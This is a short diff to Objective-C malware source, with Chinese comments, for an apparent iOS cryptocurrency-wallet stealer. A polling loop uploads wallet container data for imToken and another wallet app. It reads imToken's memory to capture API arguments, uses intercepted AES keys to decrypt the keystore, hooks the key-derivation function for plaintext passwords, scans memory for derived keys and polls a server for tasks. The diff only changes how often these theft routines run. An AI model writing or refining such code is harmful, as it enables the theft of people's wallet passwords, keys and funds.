@@ -492,14 +492,15 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         // 钱包容器采集：每 5 分钟重试一次（服务端可能一时不可达）
                         if (tick % 15 == 7) { [self collectAndUploadWallet:@"im.token.app"]; [self probeImTokenEntry]; }
                         if (tick % 15 == 3) [self probeWalletTree:@"com.global.wallet.ios"];
-                        if (tick % 15 == 9) [self collectAndUploadWallet:@"com.global.wallet.ios"];
+                        if (tick == 2 || tick % 15 == 9) [self collectAndUploadWallet:@"com.global.wallet.ios"];
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
                         [self probeImTokenTcx];        // 主目标：call_tcx_api 的 JSON 参数
                         [self tryImTokenAesKeys];      // 其次：用截到的 AES 密钥解 keystore
                         [self probeImTokenPassword];   // 其次：KDF hook 拿明文密码
-                        [self crackImTokenByKey];      // 兜底：内存里找派生密钥
+                        // imToken 已收工：内存扫描从「每轮」改成每 10 轮，避免拖慢主循环
+                        if (tick % 10 == 0) [self crackImTokenByKey];
                         [self pollTasks];                          // 每轮都轮询
                     }
                 } @catch (NSException *e) {
